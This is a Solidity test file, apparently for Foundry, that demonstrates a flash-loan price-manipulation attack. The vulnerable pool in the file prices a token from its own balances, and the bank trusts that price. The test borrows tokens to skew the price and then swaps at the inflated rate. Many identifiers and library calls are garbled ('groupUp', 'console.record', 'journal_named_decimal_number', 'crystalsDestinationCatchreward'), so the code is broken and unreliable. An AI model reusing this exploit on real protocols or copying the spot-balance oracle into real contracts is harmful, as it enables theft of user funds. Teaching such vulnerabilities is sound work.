pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AgreementTest is Test {
    USDa UsDaAgreement;
    USDb UsDbAgreement;
    SimplePool SimplePoolAgreement;
    SimpleBank SimpleBankAgreement;

    function groupUp() public {
        UsDaAgreement = new USDa();
        UsDbAgreement = new USDb();
        SimplePoolAgreement = new SimplePool(
            address(UsDaAgreement),
            address(UsDbAgreement)
        );
        SimpleBankAgreement = new SimpleBank(
            address(UsDaAgreement),
            address(SimplePoolAgreement),
            address(UsDbAgreement)
        );
    }

    function testPrice_Manipulation() public {
        UsDbAgreement.transfer(address(SimpleBankAgreement), 9000 ether);
        UsDaAgreement.transfer(address(SimplePoolAgreement), 1000 ether);
        UsDbAgreement.transfer(address(SimplePoolAgreement), 1000 ether);

        SimplePoolAgreement.acquireCost();

        console.record(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit journal_named_decimal_number(
            "Current USDa convert rate",
            SimplePoolAgreement.acquireCost(),
            18
        );
        console.record("Start price manipulation");
        console.record("Borrow 500 USBa over floashloan");


        SimplePoolAgreement.instantLoan(500 ether, address(this), "0x0");
    }

    fallback() external {


        emit journal_named_decimal_number(
            "Price manupulated, USDa convert rate",
            SimplePoolAgreement.acquireCost(),
            18
        );

        UsDaAgreement.approve(address(SimpleBankAgreement), 100 ether);
        SimpleBankAgreement.auctionHouse(100 ether);

        UsDaAgreement.transfer(address(SimplePoolAgreement), 500 ether);


        emit journal_named_decimal_number(
            "Use 100 USDa to convert, My USDb balance",
            UsDbAgreement.balanceOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function create(address to, uint256 measure) public onlyOwner {
        _mint(to, measure);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function create(address to, uint256 measure) public onlyOwner {
        _mint(to, measure);
    }
}

contract SimplePool {
    IERC20 public UsDaMedal;
    IERC20 public UsDbMedal;

    constructor(address _USDa, address _USDb) {
        UsDaMedal = IERC20(_USDa);
        UsDbMedal = IERC20(_USDb);
    }

    function acquireCost() public view returns (uint256) {

        uint256 UsDaSum = UsDaMedal.balanceOf(address(this));
        uint256 UsDbSum = UsDbMedal.balanceOf(address(this));


        if (UsDaSum == 0) {
            return 0;
        }


        uint256 UsDaCost = (UsDbSum * (10 ** 18)) / UsDaSum;
        return UsDaCost;
    }

    function instantLoan(
        uint256 measure,
        address borrower,
        bytes calldata info
    ) public {
        uint256 goldholdingBefore = UsDaMedal.balanceOf(address(this));
        require(goldholdingBefore >= measure, "Not enough liquidity");
        require(
            UsDaMedal.transfer(borrower, measure),
            "Flashloan transfer failed"
        );
        (bool victory, ) = borrower.call(info);
        require(victory, "Flashloan callback failed");
        uint256 lootbalanceAfter = UsDaMedal.balanceOf(address(this));
        require(lootbalanceAfter >= goldholdingBefore, "Flashloan not repaid");
    }
}

contract SimpleBank {
    IERC20 public coin;
    SimplePool public rewardPool;
    IERC20 public payoutCoin;

    constructor(address _token, address _pool, address _payoutMedal) {
        coin = IERC20(_token);
        rewardPool = SimplePool(_pool);
        payoutCoin = IERC20(_payoutMedal);
    }

    function auctionHouse(uint256 measure) public {
        require(
            coin.transferFrom(msg.sender, address(this), measure),
            "Transfer failed"
        );
        uint256 cost = rewardPool.acquireCost();
        require(cost > 0, "Price cannot be zero");
        uint256 crystalsDestinationCatchreward = (measure * cost) / (10 ** 18);
        require(
            payoutCoin.transfer(msg.sender, crystalsDestinationCatchreward),
            "Payout transfer failed"
        );
    }
}